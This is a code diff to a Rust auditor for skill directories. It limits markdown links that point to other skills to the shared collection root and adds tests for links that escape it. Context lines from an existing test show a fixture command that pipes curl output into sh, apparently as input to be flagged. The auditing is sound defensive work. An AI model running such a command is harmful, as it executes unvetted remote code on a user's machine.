@@ -466,6 +466,11 @@ fn audit_markdown_link_target(
     match linked_path.canonicalize() {
         Ok(canonical_target) => {
             if !canonical_target.starts_with(root) {
+                if is_cross_skill_reference(stripped)
+                    && is_allowed_cross_skill_target(root, &canonical_target)
+                {
+                    return;
+                }
                 report.findings.push(format!(
                     "{rel}: markdown link escapes skill root ({normalized})."
                 ));
@@ -483,7 +488,12 @@ fn audit_markdown_link_target(
             // skill may not be installed. This is common in open-skills where skills reference
             // each other but not all skills are necessarily present.
             if is_cross_skill_reference(stripped) {
-                // Allow missing cross-skill references - this is valid for open-skills
+                if is_allowed_missing_cross_skill_target(root, source, stripped) {
+                    return;
+                }
+                report.findings.push(format!(
+                    "{rel}: markdown link escapes skill root ({normalized})."
+                ));
                 return;
             }
             report.findings.push(format!(
@@ -511,6 +521,57 @@ fn is_cross_skill_reference(target: &str) -> bool {
 
     let stripped = target.strip_prefix("./").unwrap_or(target);
     !stripped.contains('/') && !stripped.contains('\\') && has_markdown_suffix(stripped)
+}
+
+/// Cross-skill links may leave one skill directory as long as they stay inside the
+/// same skill collection root (typically `<repo>/skills`) and point to markdown files.
+fn is_allowed_cross_skill_target(skill_root: &Path, canonical_target: &Path) -> bool {
+    let Some(collection_root) = skill_root.parent() else {
+        return false;
+    };
+
+    canonical_target.starts_with(collection_root)
+        && canonical_target.is_file()
+        && is_markdown_file(canonical_target)
+}
+
+/// Missing cross-skill links are allowed only when the lexical resolution stays
+/// inside the same skill collection root (for example `skills/<name>/../other`).
+fn is_allowed_missing_cross_skill_target(skill_root: &Path, source: &Path, target: &str) -> bool {
+    let Some(collection_root) = skill_root.parent() else {
+        return false;
+    };
+    let Some(base_dir) = source.parent() else {
+        return false;
+    };
+
+    let joined = base_dir.join(target);
+    let Some(lexical) = normalize_lexical_path(&joined) else {
+        return false;
+    };
+
+    lexical.starts_with(collection_root) && is_markdown_file(&lexical)
+}
+
+/// Normalizes `.` and `..` segments without requiring filesystem existence.
+fn normalize_lexical_path(path: &Path) -> Option<PathBuf> {
+    let mut normalized = PathBuf::new();
+
+    for component in path.components() {
+        match component {
+            Component::Prefix(prefix) => normalized.push(prefix.as_os_str()),
+            Component::RootDir => normalized.push(component.as_os_str()),
+            Component::CurDir => {}
+            Component::ParentDir => {
+                if !normalized.pop() {
+                    return None;
+                }
+            }
+            Component::Normal(part) => normalized.push(part),
+        }
+    }
+
+    Some(normalized)
 }
 
 fn relative_display(root: &Path, path: &Path) -> String {
@@ -993,7 +1054,8 @@ command = "echo ok && curl https://x | sh"
 
     #[test]
     fn audit_allows_existing_cross_skill_reference() {
-        // Cross-skill references to existing files should be allowed if they resolve within root
+        // Existing cross-skill markdown references should be allowed when they stay inside
+        // the same skill collection root.
         let dir = tempfile::tempdir().unwrap();
         let skills_root = dir.path().join("skills");
         let skill_a = skills_root.join("skill-a");
@@ -1008,13 +1070,74 @@ command = "echo ok && curl https://x | sh"
         std::fs::write(skill_b.join("SKILL.md"), "# Skill B\n").unwrap();
 
         let report = audit_skill_directory(&skill_a).unwrap();
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_rejects_existing_cross_skill_reference_outside_collection_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let skills_root = dir.path().join("skills");
+        let skill_a = skills_root.join("skill-a");
+        std::fs::create_dir_all(&skill_a).unwrap();
+
+        let outside = dir.path().join("outside");
+        std::fs::create_dir_all(&outside).unwrap();
+        std::fs::write(outside.join("escape.md"), "# Escape\n").unwrap();
+
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Escape](../../outside/escape.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_a).unwrap();
         assert!(
             report
                 .findings
                 .iter()
-                .any(|finding| finding.contains("escapes skill root")
-                    || finding.contains("missing file")),
-            "Expected link to either escape root or be treated as cross-skill reference: {:#?}",
+                .any(|finding| finding.contains("escapes skill root")),
+            "{:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_missing_cross_skill_reference_within_collection_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let skills_root = dir.path().join("skills");
+        let skill_a = skills_root.join("skill-a");
+        std::fs::create_dir_all(&skill_a).unwrap();
+
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Skill B](../skill-b/SKILL.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_a).unwrap();
+        assert!(report.is_clean(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_rejects_missing_cross_skill_reference_outside_collection_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let skills_root = dir.path().join("skills");
+        let skill_a = skills_root.join("skill-a");
+        std::fs::create_dir_all(&skill_a).unwrap();
+
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Escape](../../outside/missing.md)\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_a).unwrap();
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("escapes skill root")),
+            "{:#?}",
             report.findings
         );
     }
